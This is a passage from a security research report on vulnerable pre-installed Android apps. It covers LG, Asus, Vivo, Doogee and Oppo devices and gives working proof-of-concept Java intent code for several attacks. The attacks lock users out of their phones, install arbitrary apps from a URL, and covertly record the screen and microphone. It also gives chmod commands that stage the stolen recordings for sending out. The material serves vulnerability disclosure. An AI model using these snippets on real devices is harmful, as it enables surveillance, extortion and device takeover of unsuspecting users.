LEAGOO/t592_otd_p1/t592_otd_p1:7.
0/NRD90M/1508151212:user/release-
keys 
13. LG Android Devices – Lock the User out of Their Device 
We found a rather unique and interesting attack present on certain LG devices that allows a zero-permission 
app to lock the user out of their device by applying a screen lock that is completely unresponsive to the user 
except for making emergency phone calls. We verified that the devices show below are vulnerable. 
LG G6 - lge/lucye_nao_us_nr/lucye:7.0/NRD90U/17355125006e7:user/release-keys 
LG Q6 - lge/mhn_lao_com_nr/mhn:7.1.1/NMF26X/173421645aa48:user/release-keys 
LG X Power - lge/k6p_usc_us/k6p:6.0.1/MXB48T/171491459f52c:user/release-keys 
LG Phoenix 2 - lge/m1v_att_us/m1v:6.0/MRA58K/1627312504f12:user/release-keys  
An exposed dynamically-registered broadcast receiver within the com.android.systemui app 
(versionCode=600170209, versionName=6.00.170209) allows any app on the device to essentially lock 
the user out of their phone in most cases. This technique could be used to create a crypto-less ransomware 
to force the user to pay to unlock their device. Below are the SHA-256 hashes for the com.lge.gnsslogcat 
app’s APK file and ODEX file from the LG G6 device. 
97e5e02340417c997476861c0c4d316d0ced24dd6906f9aa2afd9f3ad15ccc0f  LGSystemUI.apk 
9dfc1b1e4591f0dc739dd583c14f8a6251626eaae302430da0e032e61772edbf  LGSystemUI.odex 
When the dynamically-registered broadcast receiver with the com.android.systemui app receives an 
intent with an action string of com.lge.CMCC_DM_PARTIALLY_LOCK, the app will write two values to the 
system table in system settings and lock the screen. The screen lock put in place by the 
com.android.systemui app that receives the broadcast intent will not be responsive to touches except for 
the emergency call button. This lock screen will persist across system reboots and even appear in safe mode. 
We were unable to find a way to remove this lock screen except when ADB was enabled prior to a third-
party app co-located on the device forcing the lock screen to lock. If ADB was not enabled on the device 
prior to the screen lock, then the user will likely have to boot into recovery mode by pressing a specific key 
combination at boot time and perform a factory reset, which will remove the screen lock but also wipe all 
the user’s data and app. If ADB was enabled prior to the appearance of this special screen lock, then the 
user could hook their device up to a computer that had already been approved provided it’s RSA key 
fingerprint to the LG device. At this point, the user can enter the following command via ADB. 
adb shell am broadcast -a com.lge.CMCC_DM_PARTIALLY_LOCK 
Or the following set of commands can undo the changes manually in the system table. 
adb shell settings put system com.lge.CMCC_DM_LOCK 0 
adb shell settings put system UnlockCallerNum 0 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
A large majority of Android users would not have ADB enabled, as this functionality is for developers and 
Android enthusiasts. In addition, they would need to find out the command to unlock it, which would likely 
be difficult for the average user to discover on their own. 
The com.android.systemui.keyguard.KeyguardViewMediator class dynamically registers a broadcast 
receiver with an action of com.lge.CMCC_DM_PARTIALLY_LOCK, as well as for other actions. When a 
broadcast intent is sent by any app on the device, it will be received by an anonymous class within the 
KeyguardViewMediator 
class. 
This 
will 
in 
turn 
call 
the 
KeyguardViewMediator.doKeyguardUnlockDisabled(Boolean, java.lang.String) method. This 
method will set both the com.lge.CMCC_DM_LOCK and UnlockCallerNum keys in the system table to a 
value of 1 and then call the KeyguardViewMediator.doKeyguardTimeout(android.os.Bundle) method 
to lock the screen. At this point, the screen will be locked and cannot be unlocked through traditional 
methods. If ADB is not enabled on the device, the user will be forced to boot into recovery mode and 
perform a factory reset to recover the device. If ADB has already been enabled, they can use the unlock 
method described above. 
14. Asus ZenFone 3 Max – Arbitrary App Installation 
The arbitrary app installation vulnerability was discovered in an Asus ZenFone 3 Max device with a build 
fingerprint of asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-14.14.1711.92-
20171208:user/release-keys. This device contains a pre-installed app with a package name of 
com.asus.dm (versionCode=1510500200, versionName=1.5.0.40_171122) has an exposed interface 
that allows any app co-located on the device to use its capabilities to download an arbitrary app over the 
internet and install it. Furthermore, any app that was programmatically installed using this method can 
also be programmatically uninstalled using the com.asus.dm app. The com.asus.dm app has an exported 
service named com.asus.dm.installer.DMInstallerService. Any app on the device can send an 
intent with specific embedded data that will cause the com.asus.dm app to programmatically download 
and install the app. For the app to be downloaded and installed, certain data needs to be provided in the 
intent: download URL, package name, version name from the app’s AndroidManifest.xml file, and the 
MD5 hash of the app. Below is an example source code to download and install the Xposed Installer APK 
file. 
Intent i4 = new Intent(); 
i4.setAction("com.asus.dm.installer.download_app"); 
i4.setClassName("com.asus.dm", "com.asus.dm.installer.DMInstallerService"); 
i4.putExtra("EXTRA_DL_URL", "https://dl-
xda.xposed.info/modules/de.robv.android.xposed.installer_v33_36570c.apk"); 
i4.putExtra("EXTRA_INSTALL_PACKAGE", "de.robv.android.xposed.installer"); 
i4.putExtra("EXTRA_DL_CHECKSUM", "36570c6fac687ffe08107e6a72bd3da7"); 
i4.putExtra("EXTRA_INSTALL_VERSION", "2.7"); 
startService(i4); 
At this point, the Xposed Installer app can be started by the app that initiated its installation. If the app that 
initiated the installation of the Xposed Installer app decides that it should be uninstalled, it can use the 
source code below to uninstall it. That this method only works for apps that were installed using the 
approach above and not for apps that were installed via other methods such as the user installing an app via 
the app distribution channel of Google Play. 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Intent i7 = new Intent(); 
i7.setAction("com.asus.dm.installer.removeService"); 
i7.setClassName("com.asus.dm", "com.asus.dm.installer.DMInstallerService"); 
i7.putExtra("EXTRA_APP_NAME", "de.robv.android.xposed.installer"); 
startService(i7); 
15. Video Recording the User’s Screen 
Sometimes pre-installed apps can expose the capability to record the user’s screen through a privileged 
pre-installed app. We provide two instances of screen recording: Vivo V7 and Doogee X5. 
15.1 Vivo V7 – Video Recording the User’s Screen 
The 
Vivo 
V7 
device 
we 
examined 
had 
a 
build 
fingerprint 
of 
vivo/1718/1718:7.1.2/N2G47H/compil04201658:user/release-keys. The device contains a pre-
installed app with a package name of com.vivo.smartshot (versionCode=1, versionName=3.0.0). This 
app will record the screen for 60 minutes and write an mp4 file to a location of the attacking app’s choosing. 
Normally, a recording notification will be visible to the user, but we will detail an approach to make it 
mostly transparent to the user. The com.vivo.smartshot app has an exported service named 
com.vivo.smartshot.ui.service.ScreenRecordService. 
The 
approach 
is 
to 
start 
the 
ScreenRecordService which will start a separate binary named /system/bin/smartshot that does the 
recording of the screen. Once the ScreenRecordService is started, it will create a sticky notification saying 
“Recording screen” and create a stop button on the side of the screen. These can be removed by then 
stopping the ScreenRecordService shortly after starting it. After the ScreenRecordService is stopped, 
the /system/bin/smartshot binary continues recording. The recording will continue for 60 minutes and 
there is the possibility that the com.vivo.smartshot app will be killed if there is memory pressure as it 
does not have any active app components. To provide an active component, the attacking app will then start 
the ScreenRecordService with some values embedded in the intent that will not start a new recording or 
interfere with the active recording. If the recording is stopped early, the file may be corrupted, so the entire 
60 minutes should be observed and then the mp4 file will be able to be played without any modification. 
Moreover, the attacking app can have the /system/bin/smartshot binary write the mp4 file to it’s private 
directory, so the attacking app does not need the READ_EXTERNAL_STORAGE permission to read from external 
storage. This is achieved by first changing the file permissions to the attacking app’s private directory, so 
it can be accessed by the /system/bin/smartshot binary, as SELinux does not block it on the device. 
Once the file permissions are changed to be world-executable on the app’s directory, it will then create an 
empty file using a specific file  name that will later be passed to the ScreenRecordService as a file name 
for the mp4 file. Then the newly created file (e.g., screen.mp4) in the attacking app’s private directory is 
made world-writable. Then the attacking app executes the code below as was explained above. 
Intent i = new Intent(); 
i.setAction("vivo.action.ACTION_START_RECORD_SERVICE"); 
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); 
i.putExtra("vivo.flag.vedio_file_path", "/data/data/com.some.app/screen.mp4"); 
i.putExtra("show_top_stop_view", false); 
startService(i); 
try { 
    Thread.sleep(500); 
} catch (InterruptedException e) { 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
    e.printStackTrace(); 
} 
i = new Intent(); 
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); 
stopService(i); 
try { 
    Thread.sleep(500); 
} catch (InterruptedException e) { 
    e.printStackTrace(); 
} 
i = new Intent("vivo.acton.ACTION_CHANGE_TOP_STOP_VIEW"); 
i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService"); 
i.putExtra("show_top_stop_view", false); 
startService(i); 
At the end of 60 minutes after executing the code above, the /system/bin/smartshot binary finishes its 
recording and the attacking app can view the previous 60 minutes of the screen usage and observe the user’s 
behavior. This may involve the user entering passwords, entering credit card numbers, writing personal 
messages and emails, etc. This file can be sent to a remote location if the attacking app has the INTERNET 
permission. 
15.2 Doogee X5 – Video Recording the User’s Screen 
This device allows third party apps to programmatically initiate the recording of the screen by sending an 
intent 
to 
a 
pre-installed 
app. 
The 
build 
fingerprint 
of 
the 
Doogee 
X5 
device 
is 
DOOGEE/full_hct6580_weg_c_m/hct6580_weg_c_m:6.0/MRA58K/1503503147:user/test-keys. This 
app has a package name of com.hct.screenrecord (versionCode=1, versionName=1.0). When the 
screen recording occurs, it is not transparent to the user. A visible effect on the screen is a blinking red 
circle. There is also a notification indicating that the screen is being recorded, although the notification is 
does not allow the user to stop the recording if clicked. The screen recording will stop when the screen goes 
off or when the user clicks the red circle. The mp4 file will be written to external storage to a base path of 
/sdcard/ScreenRecord. A third-party app can initiate the screen recording with the following source 
code. 
Intent i = new Intent(); 
i.setClassName("com.hct.screenrecord", "com.hct.screenrecord.ScreenRecordService"); 
startService(i); 
16. Oppo F5 – Audio Record the User 
This vulnerability allows an app co-located on the device to record audio of the user and their surroundings. 
To exploit this vulnerability, the command execution as the system user (see Section 4.5), must also be 
used to transfer the file due to its restrictive file permissions. The Oppo F5 device we examined had a build 
fingerprint of OPPO/CPH1723/CPH1723:7.1.1/N6F26Q/1513597833:user/release-keys. The Oppo F5 
Android device comes with com.oppo.engineermode app (versionCode=25, versionName=V1.01) pre-
installed. The com.oppo.engineermode.autoaging.MicTest activity application component within the 
com.oppo.engineermode app will start recording audio and write it to a file in the /data directory when 
it is started (e.g., /data/2018-05-03_04.42.37.amr). When this activity is started by an external app, the 
external app can wait 600 milliseconds and then send an intent to return to the home screen. This will start 
the audio recording and the app will not be visible in the recent apps due to starting the activity with the 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS flag. So the user may see an activity pop up and close 
quickly, although they will not be able to view the activity from the recent apps and would likely be unaware 
that the audio recording is occurring. The source code is provided below. 
Intent i = new Intent("com.oppo.engineermode.autoaging.MicTest"); 
i.setClassName("com.oppo.engineermode", "com.oppo.engineermode.autoaging.MicTest"); 
i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); 
this.startActivity(i); 
try { 
    Thread.sleep(600); 
} catch (InterruptedException e) { 
    e.printStackTrace(); 
} 
Intent i2 = new Intent("android.intent.action.MAIN"); 
i2.addCategory(Intent.CATEGORY_HOME); 
startActivity(i2); 
The MicTest activity component will keep recording as long as the activity is alive. The user will not be 
able to view the activity through the recent apps list to close it. While the audio recording is ongoing, there 
is no indication to the user such as a notification, toast message, etc. As the audio file is recoding, it can be 
copied to another location, and the copied file will still be playable. The attacking app does not require any 
permissions to obtain the audio recording file (an amr file), although the app will need the INTERNET 
permission if the audio file is to be sent to a remote server. Once the attacking app wants the recording file, 
it needs to determine the file name of the audio file. This can be accomplished by using the 
com.dropboxchmod app to list the files in the /data directory. Using the approach in Section 4.1.2, the 
attacking app can transfer one or all amr files to the attacking apps private directory by leveraging the 
com.dropboxchmod app that allows arbitrary command execution as the system user. SELinux for Android 
7.1.1, prevents the com.dropboxchmod app from reading from an third-party app’s private directory, but on 
the Oppo device, the system user it not prevented it from writing to a third-party app’s private directory. 
The same behavior is not present on the Asus ZenFone V Live device, although it is present on the Asus 
ZenFone 3 device. The SELinux rules dictate the capability of a platform app directly writing to a third-
party app’ private directory. Prior to making the com.dropboxchmod app write any files to its internal 
directory, it will need to make its private app directory (e.g., /data/data/some.attacking.app) both 
writable and executable. Below are the commands the attacking app can have the com.dropboxchmod app 
to transfer the audio recording file to is private app directory using the approach detailed in Section 4.5. 
cp /data/2018-05-03_04.42.37.amr /data/data/the.attacking.app 
chmod 777 /data/data/the.attacking.app/2018-05-03_04.42.37.amr 
At this point the 2018-05-03_04.42.37.amr file is readable by the attacking app and can be sent to a 
remote location.  
17. Conclusion 
Pre-installed apps present a potent attack vector due to their access to privileged permissions, potential 
widespread presence, and the fact that the user may not be able to disable or remove them. Vulnerable 
pre-installed apps can present a tangible threat to end-users since certain apps will contain exposed 
interfaces that will leak PII to locations accessible by other apps on the device. Furthermore, certain 
vulnerabilities facilitate surveillance and can record audio and/or the user’s screen and see all interactions 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
that a user has with the device. In addition, a keylogging capability can capture the user’s input. As we 